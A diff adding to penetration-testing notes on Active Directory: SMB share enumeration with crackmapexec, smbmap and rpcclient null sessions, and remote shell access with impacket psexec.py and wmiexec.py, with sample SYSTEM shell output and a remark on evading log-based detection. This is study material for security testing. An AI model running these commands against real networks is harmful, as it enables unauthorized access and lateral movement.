@@ -415,7 +415,93 @@ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
 
 #### Shares
 
+##### crackmapexec
 
+[CrackMapExec](crackmapexec.md):
+
+```shell-session
+# Enumerate shares
+crackmapexec smb $ip -u <username> -p <password> --shares
+
+# The module spider_plus will dig through each readable share on the host and list all readable files. 
+sudo crackmapexec smb  $ip --local-auth -u <username> -p <password> -d <DOMAIN> -M spider_plus --share 'NameOfShare'
+# CME writes the results to a JSON file located at /tmp/cme_spider_plus/<ip of host>
+
+```
+
+
+##### SMBMap
+
+[smbmap](smbmap.md)
+
+```bash
+# Enumerate network shares and access associated permissions.
+smbmap -H $ip
+
+# # Enumerate network shares and access associated permissions with recursivity
+smbmap -H $ip -r
+# --dir-only: provides only the output of all directories and did not list all files.
+
+# Chack access and permissions level for a folder with recursion
+smbmap -u $username -p $password -d $domain -H $ip -R $nameofFolder --dir-only
+
+
+```
+
+##### rpcclient
+
+[rpcclient](rpcclient.md)
+
+```bash
+# SMB NULL Session with rpcclient
+rpcclient -U "" -N $ip
+```
+
+
+
+```shell-session
+# SMB NULL Session with rpcclient
+rpcclient -U "" -N $ip
+
+# Connect to a remote shared folder (same as smbclient in this regard)
+rpcclient -U "" 10.129.14.128
+rpcclient -U'%' 10.10.110.17
+
+# Server information
+srvinfo
+
+# Enumerate all domains that are deployed in the network 
+enumdomains
+
+# Provides domain, server, and user information of deployed domains.
+querydominfo
+
+# Enumerates all available shares.
+netshareenumall
+
+# Provides information about a specific share.
+netsharegetinfo <share>
+
+# Get Domain Password Information
+getdompwinfo
+
+# Enumerates all domain users.
+enumdomusers
+
+# Provides information about a specific user.
+queryuser <RID>
+	# An example:
+	# rpcclient $> queryuser 0x3e8
+
+# Provides information about a specific group.
+querygroup <ID>
+
+# Enumerating Privileges
+enumprivs
+
+# Enumerating SID from LSA
+lsaenumsid
+```
 
 ### Password spraying attack
 
@@ -490,6 +576,41 @@ By gaining SYSTEM-level access on a domain-joined host, you will be able to perf
 - Perform token impersonation to hijack a privileged domain user account.
 - Carry out ACL attacks.
 
+#####  PSExec.py
+
+Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager`. Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.
+
+
+```shell-session
+# Get help 
+impacket-psexec -h
+
+# Connect to a remote machine with a local administrator account
+psexec.py $domain/$user:$password@$ip 
+
+# Another way
+impacket-psexec administrator:'<password>'@$ip
+```
+
+```
+# Results
+C:\Windows\system32>whoami
+nt authority\system
+```
+##### wmiexec.py
+
+Wmiexec.py utilizes a semi-interactive shell where commands are executed through [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands).
+```shell-session
+# Connect to a remote machine with a local administrator account
+wmiexec.py $domain/$user:$password@$ip 
+```
+
+
+```
+# Results
+C:>whoami
+domain\user22
+```
 
 
 ## Attacking AD from Windows
@@ -749,15 +870,16 @@ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestric
 
 
  [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run.
- 
- ```powershell
+  
+```powershell
  # Enumerate AppLocker policies 
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
 
 
 [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) is a powershell functions that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS). It includes finding groups specifically delegated by sysadmins, finding users with "All Extended Rights" that can view passwords, and viewing all computers with LAPS enabled. 
- An account that has joined a computer to a domain receives All Extended Rights over that host, and this right gives the account the ability to read passwords. Enumeration may show a user account that can read the LAPS password on a host. This can help us target specific AD users who can read LAPS passwords.
+
+An account that has joined a computer to a domain receives `All Extended Rights` over that host, and this right gives the account the ability to read passwords. Enumeration may show a user account that can read the LAPS password on a host. This can help us target specific AD users who can read LAPS passwords.
 
 ```powershell
 # Search for computers that have LAPS enabled when passwords expire
